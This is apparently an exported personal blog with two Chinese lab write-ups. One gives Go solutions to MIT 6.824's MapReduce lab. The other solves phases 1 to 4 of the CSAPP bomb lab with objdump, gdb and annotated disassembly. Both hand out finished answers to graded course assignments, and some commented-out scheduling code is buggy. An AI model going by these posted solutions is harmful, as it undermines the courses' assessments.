    <content type="text"><![CDATA[&emsp;&emsp;MIT6.824是一门非常出名的分布式课程，在这门课里，我们能了解到分布式系统的前生今世，领略一种种令人拍案叫绝的算法，顺便学一下人际管理，有人戏称，分布式系统是一门在你有多个女朋友并且她们都相互认识的情况下，将她们妥善安置的学问，细细一想，觉得很有道理，然而真学完这门课估计就找不到女朋友了，因为那时候已经秃头了… 言归正传，我刚上完前两节课程（其实就是看了一篇mapreduce论文和go语言入门），就来做lab1了，收获良多，下面分享一下我做lab1时的一些认识和想法。 lab1要求使用Go语言实现mapreduce，包括任务安排、节点调度以及map和reduce的操作和相互之间的配合。事实上，大部分代码已经写好了，我们只需要完成核心的代码就可以了。但是我还是建议大家看看其他的代码，从中可以学到许多东西。包括但不限于如何将问题拆分为几个小问题，如何构建一个微型服务器，如何去在客户和服务之间交互，如何设计相关的数据结构和服务，这些都能在6.824/src/mapreduce/*.go文件里找到。 预备知识在mapreduce框架下，执行一个job可以大致分为以下几个过程： 由用户确定输入文件的数量，map和reduce函数，以及reduce任务的数量(nReduce)。 序会自动创建一个master节点。master节点首先会开启一个RPC服务器(在master_rpc.go里），然后等待worker注册（使用rpc call Register()，定义在master.go里）。当任务来临时，master决定如何将任务分配给workers，以及如何处理workers failures的情况（schedule()定义在schedule.go里）。 master将一个输入文件看成是一个map任务，并且给每个map任务至少调用一次doMap()（在common_map.go里）。这时候有两种情况，当模式选择的是sequential()时，master节点直接进行map任务；如果使用分布式的模式，那么master节点会通过DoTask的RPC调用将任务分派给workers(在works.go）。每一个对doMap()的调用都会自动读取相应文件，并且对文件里的数据进行预先定义好的map操作，并且最终的key/value结果存放在workers本地的nReduce中间文件中。doMap()会对任务进行hash以决定对应的reduce中间文件。所以一次任务一共会产生nMap*nReduce个中间文件（每个map节点创建nReduce个中间文件）。每个文件名字会包含一个前缀，其中包括map任务的编号，以及reduce任务的编号。例如，如果有两个map任务和3个reduce任务，那么将会创建6个中间文件（一般情况下是reduce节点少于map节点）。 mrtmp.xxx-0-0mrtmp.xxx-0-1mrtmp.xxx-0-2mrtmp.xxx-1-0mrtmp.xxx-1-1mrtmp.xxx-1-2 当map节点完成任务并且生成了nReduce个中间文件后，master会给每个reduce任务至少调用一次doReduce()(在common_reduce.go里）函数。同样的，和doMap()一样，会根据sequentil模式和分布式模式里决定直接在master节点运行或者是分配到reduce节点运行。doReduce()会控制第r个reduce节点读取所有map节点的第r个中间文件，并且对读取到的数据进行定义好的reduce操作。最终，一共会产生nReduce个输出文件。 在所有reduce都完成任务之后，master节点会调用mr.merge()(在master_splitmerge.go里）合并nReduce个输出文件。 最后master节点发送shutdown RPC命令给每一个在master这里注册的worker让他们关机，然后关闭master节点中的RPC 服务器。 注：这个实验只需要改写doMap,doReduce和schedule三个函数，他们分别在common_map.go,common_reduce.go和schedule.go三个文件中。同样的，你需要在../main/wc.go里定义map和reduce函数。你不需要去改动其他函数，但是阅读其他函数有助于帮助你理解代码逻辑，加深对整个系统架构的理解。 Part1-实现map和reduce节点的核心代码map节点和reduce节点的核心代码并不是实现map函数和reduce函数，后两者是用户提供的。map节点具体的核心代码如下： 读取需要处理的文件。 对读取内容调用客户定义好的map函数。 将map结果输出为nReduce个中间文件，方便reduce节点获取。（用hash函数来确定哪些结果应该存放到那个中间文件中，这样一来不同map节点的相同数据就能映射到同一个reduce节点里处理） 123456789101112131415161718192021222324252627282930313233func doMap( jobName string, // the name of the MapReduce job mapTask int, // which map task this is inFile string, nReduce int, // the number of reduce task that will be run ("R" in the paper) mapF func(filename string, contents string) []KeyValue,) &#123; //读入文件中的数据 //此处应有处理读取失败的处理，不过刚学go，不太熟悉，就不检查了。 fileContent, _ := ioutil.ReadFile(inFile) KVpairs := mapF(inFile, string(fileContent)) //保存到本地，两个问题 //第一，需要知道保存的文件名 //文件名可以通过reduceName(jobName, mapTask, r)获得 //第二，关键是以什么样的格式保存到本地 //上面有提示，虽然不需要使用json格式保存到本地，但是因为reduce输出的是json //所以这里也使用json格式熟悉一下。 mapFiles := make(map[string]*json.Encoder) for n:=0; n &lt; nReduce; n++&#123; filename := reduceName(jobName, mapTask, n) file, _ := os.Create(filename) //return之后才进行defer之后的语句 defer file.Close() mapFiles[filename] = json.NewEncoder(file) &#125; for _, kv := range KVpairs &#123; kvfile := reduceName(jobName, mapTask, ihash(kv.Key)%nReduce) mapFiles[kvfile].Encode(&amp;kv) &#125;&#125; reduce节点的工作流程： 从所有map节点中读取属于自己的中间文件。 对本节点的key值进行排序，方便后续处理。 对每一个key值调用客户定义好的reduce函数。 将结果输出到共享文件系统。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455func doReduce( jobName string, // the name of the whole MapReduce job reduceTask int, // which reduce task this is outFile string, // write the output here nMap int, // the number of map tasks that were run ("M" in the paper) reduceF func(key string, values []string) string,) &#123; //string:[]string =&gt; key值:对应的value数组 kStingPairs := make(map[string][]string) //每个key值保存一次 keySlice := make([]string, 0) //读取m个map节点对应的中间文件 for i := 0; i &lt; nMap; i++&#123; file, _ := os.Open(reduceName(jobName, i, reduceTask)) enc := json.NewDecoder(file) for &#123; var kv KeyValue err := enc.Decode(&amp;kv) if err != nil&#123; break &#125; _, ok := kStingPairs[kv.Key] if !ok&#123; //如果字符串是第一次遍历，那么初始化其切片。 //切片append前需要初始化 kStingPairs[kv.Key] = make([]string, 0) keySlice = append(keySlice, kv.Key) &#125; kStingPairs[kv.Key] = append(kStingPairs[kv.Key], kv.Value) &#125; //也可以在之前defer file.Close() //不过defer是return时才执行，我想早点关闭文件。 file.Close() &#125; //对key值排序，使得输出是有序的 sort.Strings(keySlice) mergeSlice := make([]KeyValue, 0) //对每个key进行reduce操作 for _, key := range keySlice&#123; res := reduceF(key, kStingPairs[key]) mergeSlice = append(mergeSlice, KeyValue&#123;key, res&#125;) &#125; //存结果 file, _ := os.Create(outFile) defer file.Close() env := json.NewEncoder(file) for _, kv := range mergeSlice&#123; env.Encode(&amp;kv) &#125;&#125; Part2-实现简单的字频统计没什么好说的，根据提示查一下go如何切分字符串即可。 1234567891011121314151617181920212223242526func mapF(filename string, contents string) []mapreduce.KeyValue &#123; // Your code here (Part II). kvpairs := make([]mapreduce.KeyValue, 0) f := func(r rune)bool&#123; return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) &#125; //https://golang.org/pkg/strings/#FieldsFunc //将满足string中满足f的去掉，并且以满足f的作为两个word之间的分割线 words := strings.FieldsFunc(contents, f) for _, word := range words&#123; kvpairs = append(kvpairs, mapreduce.KeyValue&#123;word, strconv.Itoa(1)&#125;) &#125; return kvpairs&#125;func reduceF(key string, values []string) string &#123; // Your code here (Part II). res := 0 for _, val := range values&#123; valInt, _ := strconv.Atoi(val) res = res + valInt &#125; return strconv.Itoa(res)&#125; Part3&amp;4分布式容错执行mapreduce相关背景part3&amp;4才是这一个lab的精髓，要求使用RPC通信，调用多个节点执行map操作和reduce操作，难度较大，特别是并行操作环境下有些bug不好找。 &emsp;&emsp;part3需要在master建立服务，然后在每一个worker节点也建立服务，对于master节点而言，worker节点是客户；对于worker而言，master节点是客户。要想多节点调度实现mapreduce,首先要做的，就是在master和每个worker节点建立相应的服务器，用来协调流程，发送指令，传递数据。 之前一直以为map节点和reduce节点是两套不同的服务器代码，完成了part3之后我才明白，原来节点的框架代码都是一样的。具体来说，工作节点（不管是map节点还是reduce节点）中负责与master节点交互的部分被抽象出来单独写成一套代码，map/reduce节点只是worker节点执行的任务不同，换句话说，执行map操作的工作节点就叫map节点，执行reduce操作的工作节点就叫reduce节点。如此一来，一个工作节点可能之前是map节点，后面就可以变成reduce节点，大大提升了利用率，是我之前狭隘了。首先我们思考一下，客户连接服务器需要哪些信息？第一，当然是得知道服务器的地址；第二，是你所需要调用的服务，在这里也就是要调用的函数；第三，客户提供调用函数所需要的参数；第四，怎么获取服务器的返回信息。 &emsp;&emsp;相应的，要建立服务器，首先要确定一个地址，其次要确定本服务器所能提供的服务（也就是函数），最后还要确定如何与客户进行信息交互。&emsp;&emsp;以上这些都能在master.go和worker.go里面找到，其实只要解决以上几个问题，一个服务器就建立起来了。 认识问题回到mapreduce，我们可以从功能上将mapreduce拆解为以下几个节点： map节点部分：包括读取相应文件，进行map操作，存储中间文件。 reduce节点部分：包括在所有map节点读取相关文件，进行reduce操作，然后合并输出一个文件。 master节点部分：负责分发任务、统筹节点、生成最后的输出结果。 同样的，从任务交互角度出发，程序可以拆分为以下几点： 任务调度：如何将任务分发给相应的节点，以及如何调度不同的工作节点。 状态通知：如何得知各个节点的状态，如何得知节点准备就绪，如何得知任务已经完成。 错误恢复：如果在执行任务时有节点加入如何处理，如果在执行任务时节点失联如何处理，master、map、reduce在处理方式上有什么不同。 认识到上面几个问题，就能对整个系统有一个宏观的理解和把控。 了解程序通过通读其他代码，我们对程序的运行环境有如下认识： 整个程序是建立在所有节点都运行在一个共享文件系统上的。所以不同节点之间不需要传送文件信息，而只需要传递需要处理的文件名，map和reduce节点通过这个文件名获取相应的数据。所以系统内部只需要传递指令，这些指令由worker和master节点提供的函数构成。 在schedule.go中，描述了master节点和worker节点之间交互的代码，包括建立连接，调用对方的函数，更改变量值，传递指令，结束连接。maste和worker之间通过call来联系，call的第一个参数就是需要联系的服务器名称或者是服务器上需要调用的函数。 正常情况下，worker节点只会注册一次，然后直到接受master的指令才会shutdown，自始至终只会发送一次注册信息，当然如果是节点坏了另说。 问题分析part3&amp;4主要是将多个文件分发到多个节点上，并且要求并行处理。既然是并行处理，那当然是要用goroutine了。这样我们需要解决几个问题： 如何知道哪些节点可用？ 答：程序中有registerChan管道，专门用来通知可用的节点。 如果输入文件大于worker节点数量，也即是一个worker节点可能需要前后运行多个任务，然而worker节点只会注册一次，调度程序如何得知worker已经完成之前的任务了？ 答：worker完成本轮任务后，将本worker再放到registerChan管道里即可，再注册一次。 如果因为节点失效导致任务执行失败怎么办？ 答：两种方法，第一个方法是维护一个失败任务的列表（我一开始的想法），运行完一轮后，接着重新运行失败的任务，无限循环，直到任务全部执行成功为止；第二个方法，在开的每个goroutine里执行死循环，直到任务执行成功才跳出（网上的办法，确实是好很多，并且不用加锁）。 以上就是part3&amp;4的核心问题，解决了这几个问题，schedule也就解决了。 程序思路总的来说，part3&amp;4的思路是这样的： 通过registerChan获取可用的worker节点 通过call()函数给可用的worker节点分发任务 处理失败的任务 使用Sync.WaitGroup等待所有goroutine完成 第一种方法：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//=========================================================================================================================//统计执行失败的任务编号，在下一个循环中继续执行，直到所有任务都执行完毕。//=========================================================================================================================// All ntasks tasks have to be scheduled on workers. Once all tasks// have completed successfully, schedule() should return.//// Your code here (Part III, Part IV).//////var wg sync.WaitGroup //等待所有goroutine完成//var taskMutex sync.Mutex //控制失败任务的锁//////toDoTaskNumber记录需要完成的任务编号//toDoTaskNumber := make([]int, ntasks)//for i := 0; i &lt; ntasks; i++&#123;// toDoTaskNumber = append(toDoTaskNumber, i)//&#125;////for &#123;// //toDoTaskNumber：每次要完成任务的编号// //failedTasksNumber：保存失败任务的编号，下一次完成// failedTasksNumber := make([]int, 0)// for _, taskNumber := range toDoTaskNumber &#123;//// //注意worker节点只会在一开始注册一次！// //当goroutine完成时，再次通过registerchan注册可用节点// curWork := &lt;-registerChan//// wg.Add(1)//// var task string// if phase == reducePhase&#123;// task = ""// &#125;else&#123;// task = mapFiles[taskNumber]// &#125;// //分配任务// //这里必须以函数调用方式传递参数，否则go里面的变量会绑定为taskNumber和task本身，而不是其遍历的值，最后的结果就是多个goroutine运行同一个任务// go func(curWorker string, taskNum int, task string) &#123;// defer wg.Done()// ok := call(curWorker, "Worker.DoTask", DoTaskArgs&#123;jobName, task, phase, taskNum, n_other&#125;, nil)// if !ok &#123;// fmt.Printf("%s phase #%d task failed in %s", phase, taskNum, curWorker)// taskMutex.Lock()// failedTasksNumber = append(failedTasksNumber, taskNum)// taskMutex.Unlock()// &#125; else &#123;// //仅仅写registerChan &lt;- curWorker，最后的几个chan会堵塞，因为主程序已经结束了，管道另一边无法接收数据。// //所以另开一个goroutine防止堵塞// go func() &#123; registerChan &lt;- curWorker &#125;()// &#125;// &#125;(curWork, taskNumber, task)// &#125;//// wg.Wait()// remain := len(failedTasksNumber)// fmt.Printf("#%d tasks failed, total: %d\n", remain, ntasks)// //所有工作都成功// if remain == 0 &#123;// break// &#125;//// //继续完成未完成的工作// toDoTaskNumber = toDoTaskNumber[:remain]// copy(toDoTaskNumber, failedTasksNumber)// &#125; 第二种方法：12345678910111213141516171819202122232425262728293031//=========================================================================================================================//网上的做法//在执行任务的goroutine里死循环，直到任务执行完为止//=========================================================================================================================var wg sync.WaitGroupfor taskNumber := 0; taskNumber &lt; ntasks; taskNumber++&#123; var task string if phase == mapPhase&#123; task = mapFiles[taskNumber] &#125;else&#123; task = "" &#125; taskArgs := DoTaskArgs&#123;jobName, task, phase, taskNumber, n_other&#125; wg.Add(1) go func(taskArg DoTaskArgs) &#123; defer wg.Done() for&#123; worker := &lt;- registerChan ok := call(worker, "Worker.DoTask", taskArgs, nil) if ok&#123; //开goroutine防止最后几个执行任务的协程阻塞（因为已经没有其他协程接收管道了） go func() &#123; registerChan &lt;- worker &#125;() break &#125; &#125; &#125;(taskArgs)&#125;wg.Wait() 坑做的时候遇到了几个坑，分享一下。 在part3 test的时候，会提示缺少pbservice,viewservice等包，这是前几年大作业用到的包，现在（似乎）没有用了。进入6.824/src/main,将diskvd.go,pbc.go,pbd.go,viewd.go删除，或者移到其他文件夹就好。（至少移除后lab1可以正常操作，lab2以后需不需要暂时未知） 假设有这么一段程序1234567891011Var wg sync.waitgroupFor xxx&#123; Reg := &lt;- chan Wg.add(1) Go func()&#123; defer wg.done() //do something Chan &lt;- good &#125;()&#125;Wg.wait() 问题描述：假设在2个节点上运行20个map任务，你会发现，20个任务完成了，但是卡住了。&emsp;&emsp;经过print大法，你发现原来是最后两个goroutine卡住了，为什么呢？&emsp;&emsp;经过仔细思考，你发现原来是因为最后两个节点上分别各运行着一个goroutine，而这两个goroutine里都有一个管道阻塞了。&emsp;&emsp;这时候问题就出来了。当你执行到最后两个任务时，主程序早已经结束了for循环，但是goroutine里被管道阻塞了，而管道的另一头却在for循环里。&emsp;&emsp;也就是说，此时管道只有进，没有出，当然卡住了。 解决方法：在主程序拿一个数组保存chan的值，但是这时候问题又来了，你怎么知道最后一共有多少个goroutine阻塞？而且这样只不过是从管道发送阻塞变成管道接收阻塞而已。&emsp;&emsp;念头一转，你觉得直接chan.close()也许可行？可惜也不可以，同样的，我们也不知道goroutine什么时候结束，管道关早了同样会阻塞。&emsp;&emsp;这时候我们重新梳理下我们的需求：&emsp;&emsp;我们希望goroutine里的管道不会阻塞当前的goroutine，并且管道的值可能以后还会用到，最好在后续接收前是阻塞的，等待有需要的代码提取管道里的值，而不是单纯的丢弃。&emsp;&emsp;没错，你灵光一闪！发现再开一个goroutine不就好了吗。&emsp;&emsp;Go func(){chan &lt;- good}()，完美解决问题。 事后总结：这个开goroutine防止阻塞的方法还是我在看master.go里学到的，多看看人家的代码还是有好处的。以后遇到可能会阻塞的东西，特别是包含管道这种说不清道不明的东西，还是另开一个goroutine吧。&emsp;&emsp;Part3&amp;4第二种方法在思维上实在比第一种方法要好太多。第一种方法其实是没有理清程序的功能。我们再来回顾一下这段代码，这段代码有两个功能，第一分发任务，第二完成任务。由于完成任务是单独开一个goroutine完成的，所以主程序实际上只有一个功能，那就是分发任务，至于任务如何完成？是否成功完成？任务失败如何处理？这些都应该是属于处理任务的goroutine的功能，而不应该放在主程序里。第二种方法实际上将这段代码进一步抽象成分发任务和处理任务两个模块，并且明确了每个模块的功能，保证每个模块能完成应尽的任务，而绝不跨模块完成不属于自己功能，层次分明，五星好评。这种分解问题，划分模块，明确功能的思维以后要好好训练一下才行。 part5-统计一个单词出现在多少个文件里也没什么好说的。123456789101112131415161718192021222324252627282930313233343536373839404142434445func inArray(arr []mapreduce.KeyValue, ele string)bool&#123; if len(arr) == 0&#123; return false &#125; for _, word := range arr&#123; if word.Key == ele&#123; return true &#125; &#125; return false&#125;// The mapping function is called once for each piece of the input.// In this framework, the key is the name of the file that is being processed,// and the value is the file's contents. The return value should be a slice of// key/value pairs, each represented by a mapreduce.KeyValue.func mapF(document string, value string) (res []mapreduce.KeyValue) &#123; // Your code here (Part V). f := func(r rune)bool&#123; return !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r) &#125; //https://golang.org/pkg/strings/#FieldsFunc //将满足string中满足f的去掉，并且以满足f的作为两个word之间的分割线 words := strings.FieldsFunc(value, f) for _, word := range words&#123; if !inArray(res, word)&#123; res = append(res, mapreduce.KeyValue&#123;word, document&#125;) &#125; &#125; return&#125;// The reduce function is called once for each key generated by Map, with a// list of that key's string value (merged across all inputs). The return value// should be a single output value for that key.func reduceF(key string, values []string) string &#123; // Your code here (Part V). sort.Strings(values) res := strconv.Itoa(len(values))+" "+values[0] for i := 1; i &lt; len(values); i++&#123; res = res + "," + values[i] &#125; return res&#125;]]></content>
      <categories>
        <category>分布式</category>
        <category>MIT</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSAPP-lab2-BOMB]]></title>
    <url>%2F2019%2F05%2F15%2FCSAPP-lab2%2F</url>
    <content type="text"><![CDATA[本次实验主要考察汇编代码以及GDB调试的应用。实验总共要求6次输入，每次输入都正确才算完成实验，每次输入的值隐藏在汇编代码中。实验通过反汇编二进制文件得到汇编代码，通过GDB查看寄存器值和内存器值辅助阅读代码，理解代码之间的逻辑及联系，找到解题的关键。 预备知识首先介绍一下要用到的命令： 反汇编bomb文件，并将得到的汇编代码保存在code.txt中方便查看。（只需要汇编代码就行，符号表不需要） 12objdump -d bomb &gt; code.txt gdb命令： gdb bomb 用gdb对bomb进行调试 run 从头开始运行程序 kill 结束运行程序 break *0x80483c3 在地址0x80483c3处设置断点 delete 删除所有断点 stepi 运行一条指令 continue 继续执行直到遇到下一个断点 until 3 据徐执行直到遇到断点3（gdb会自动给每个断点编号） print /x $rax 以16进制打印寄存器中rax的值 print /x ($rsp+8) 以16进制打印rsp的内容+8的值。注意这里是rsp寄存器的内容，而不是所对应的栈地址的值。简单来说，是得到$rsp+8的值，而不是($rsp+8)的值。 x/w 0xbffff890 检索以地址0xbffff890为首连续四个字节的数据。 x/s 0xbffff890 检索以地址0xbffff890为首的字符串。 x/w ($rsp+8) 检索以rsp+8为首地址的四个字节，简单来说，是获得(rsp+8)而不是rsp+8。 phase_1第一个炸弹非常简单，方便我们熟悉汇编代码和gdb的操作。 首先在code.txt中找到main函数的代码，因为程序总是从main开始开始的，然后找到第一个炸弹phase_1的程序入口，查看代码。 分析phase_1中的代码，当执行嵌套函数&lt;strings_not_equal&gt;后，寄存器eax的值为0时可以解除第一个炸弹。所以我们查看strings_not_equal的代码，观察什么条件下才能使得eax=0。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283840000000000401338 &lt;strings_not_equal&gt;:401338: 41 54 push %r1240133a: 55 push %rbp40133b: 53 push %rbx40133c: 48 89 fb mov %rdi,%rbx //rbx此時指向输入字符串的首字節地址40133f: 48 89 f5 mov %rsi,%rbp #rsi=正确字符串地址401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt;401347: 41 89 c4 mov %eax,%r12d //r12d保存输入字符串的长度40134a: 48 89 ef mov %rbp,%rdi //rbp指向正确字符串的地址40134d: e8 c9 ff ff ff callq 40131b &lt;string_length&gt;401352: ba 01 00 00 00 mov $0x1,%edx401357: 41 39 c4 cmp %eax,%r12d40135a: 75 3f jne 40139b &lt;strings_not_equal+0x63&gt; //长度不相等后面就不用比较了40135c: 0f b6 03 movzbl (%rbx),%eax //如果(rbx)即输入字符串为空，则认为解除炸弹，若不为空，则需要和正确字符串比较。40135f: 84 c0 test %al,%al401361: 74 25 je 401388 &lt;strings_not_equal+0x50&gt;401363: 3a 45 00 cmp 0x0(%rbp),%al //判断正确字符串当前字母，与输入字符串当前字母是否相等401366: 74 0a je 401372 &lt;strings_not_equal+0x3a&gt;401368: eb 25 jmp 40138f &lt;strings_not_equal+0x57&gt;40136a: 3a 45 00 cmp 0x0(%rbp),%al40136d: 0f 1f 00 nopl (%rax) //占位，空操作401370: 75 24 jne 401396 &lt;strings_not_equal+0x5e&gt;401372: 48 83 c3 01 add $0x1,%rbx401376: 48 83 c5 01 add $0x1,%rbp40137a: 0f b6 03 movzbl (%rbx),%eax40137d: 84 c0 test %al,%al40137f: 75 e9 jne 40136a &lt;strings_not_equal+0x32&gt;401381: ba 00 00 00 00 mov $0x0,%edx #(rbx)和(rbp）逐个字母比较，如果(rbx)即输入字符串为空，意味着输入字符串检查完了。 #又因为能进到这段程序意味着输入字符串与正确字符串长度相等，可以知道当出现空时，代表输入和正确字符串相等;若不为空，则继续比较。 #所以接下来的事情很简单，断点，查看每一次rbp字符串对应的内存地址的字母即可。401386: eb 13 jmp 40139b &lt;strings_not_equal+0x63&gt;401388: ba 00 00 00 00 mov $0x0,%edx40138d: eb 0c jmp 40139b &lt;strings_not_equal+0x63&gt;40138f: ba 01 00 00 00 mov $0x1,%edx401394: eb 05 jmp 40139b &lt;strings_not_equal+0x63&gt;401396: ba 01 00 00 00 mov $0x1,%edx40139b: 89 d0 mov %edx,%eax //返回eax=0表示输入的字符串正确40139d: 5b pop %rbx40139e: 5d pop %rbp40139f: 41 5c pop %r124013a1: c3 retq 仔细阅读代码，发现就是比较rsi和rdi寄存器的值，若相同则能使eax为0。运行程序，输入数据，发现rdi存放的就是我们输入的数据，那么rsi就是正确的数据。回到phase_1中，发现rsi的值是0x402400。ok，直接使用x/s 0x402400即可获得正确的字符串。 phase_2第二个实验比较直观，看汇编代码就可以。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051520000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; //读6个数字 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) //rsp指向的就是读到的第一个数字，并且判断第一个数字是不是1 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; //如果是1,那么继续，否则爆炸;也就是说，正确序列第一个数字是1 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax //后一个正确的数字应该是前一个数字的两倍。显然正确序列就是1 2 4 8 16 32 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx //一个数字int是4个字节 400f29: 48 39 eb cmp %rbp,%rbx //rbp用于结束循环 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq phase_3第三个炸弹比较巧妙。根据汇编代码以及gdb查看寄存器值，我们可以判断出eax存放的是输入的数据个数，当输入个数大于等于2时，eax=2，输入一个数时eax为1，而这里要求eax大于1，再结合上下代码，我们可以判断出一个只需要输入两个数字，第一个数字存放在rsp+8中，第二个存放于rsp+0xc中，即便你输入更多的数字，也只有前两个是有效的，其余忽略。 仔细查看代码，可以发现最重要的一行跳转指令jmpq 0x402470(,%rax,8)，程序将跳转到(0x402470+8第一个数字）处，并赋值eax，然后eax和输入的第二个数字进行比较，若相等，则解除炸弹。查看地址0x402488，发现其内容是0x400f8a，恰好是跳转到后面的指令。 这很好理解，0x402488是一张表table的起始点，第一个数字是索引下标index，第二个数字等于table[index]的值即可解除炸弹。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677780000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 400f60: 83 f8 01 cmp $0x1,%eax #%eax保存输入个数，输入个数大于等于2则eax=2,输入1个数eax=1,这里只要求输入个数大于1个即可， #但实际有效输入只有前两个，其他忽略，比如3 256是正确，那么3 256 78 也是正确的。 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; #($rsp+8)=输入的第一个值，类似于数组A的下标n,($rsp+0xc)=输入的第二个值，与数组A[n]存放的值进行比较， 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; #x/w 0x402470+8*%rax可以查看跳转地址，相当于查看第n个数组值x 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) #第二个输入值等于x即可。 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 400f83: b8 c3 02 00 00 mov $0x2c3,%eax #第一个输入为2，第二个输入为0x2c3 400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt; 400f8a: b8 00 01 00 00 mov $0x100,%eax #第一个输入为3，第二个输入为0x100 400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt; 400f91: b8 85 01 00 00 mov $0x185,%eax #第一个输入为4，第二个输入为0x185 400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt; 400f98: b8 ce 00 00 00 mov $0xce,%eax #第一个输入为5，第二个输入为0xce 400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt; 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax #第一个输入为6，第二个输入为0x2aa 400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt; 400fa6: b8 47 01 00 00 mov $0x147,%eax #第一个输入为7，第二个输入为0x147 400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt; 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt; 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq phase_4简单分析一下代码，发现eax代表的是读入的数字，当读入数字大于等于2时，eax=2，否则eax为1。而rsp+8存放的是第一个读入的数字，rsp+c存放的是第二个读入的数字，如果你输入多余2个数字，那么其余数字将会舍弃。 仔细看一下代码，发现只有一处cmpl $0x0, 0xc(%rsp)用到了第二个输入数字，结合判定条件，显然第二个数字是0。 再分析一下func4这个代码，当且仅当ecx等于第一个输入数字时，程序才会返回eax=0这个我们想要的结果。而第一次进入func4时，ecx的值是7，所以第一个输入的数字是7。 Func4其他的代码构成了一个递归序列，属于烟雾弹坑人的，一开始我掉进去了很久才醒悟过来。根本没必要弄清楚函数递归时各个寄存器的关系，只需要弄明白什么条件下能获得想要的结果就行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax #%eax=输入个数，输入个数大于等于2,则%eax=2，比如输入2 3 4，%eax也等于2,输入3,%eax=1 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) #%rsp+8存储值小于等于0xe，%rsp+8保存第一个输入值，%rsp+0xc保存第二个。这题只有2个有效输入值。 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax #%eax=0才能解除 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) %rsp+0xc存储值=第二个输入数字=0 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq 